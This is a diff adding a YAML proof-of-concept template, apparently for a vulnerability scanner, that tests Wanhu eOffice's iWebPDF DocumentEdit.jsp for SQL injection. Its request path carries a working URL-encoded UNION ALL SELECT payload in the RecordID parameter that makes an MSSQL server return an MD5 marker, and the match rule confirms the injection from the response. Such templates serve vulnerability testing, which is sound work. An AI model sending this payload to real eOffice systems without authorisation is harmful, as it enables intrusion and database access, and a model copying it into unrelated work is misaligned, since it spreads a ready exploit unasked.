@@ -1,0 +1,17 @@
+name: poc-yaml-wanhu-eoffice-iwebpdf-documentedit-sql
+transport: http
+set:
+  s1: randomInt(100000, 200000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: >-
+        /defaultroot/public/iWebPDF/DocumentEdit.jsp;?RecordID=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2C%28select+sys.fn_varbintohexstr(hashbytes('MD5','{{s1}}'))%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20f
+      follow_redirects: false
+    expression: >-
+      response.status == 200 &&
+      response.body_string.contains(substr(md5(string(s1)), 2, 28))
+expression: r0()
+detail:
+  author: h1ei1
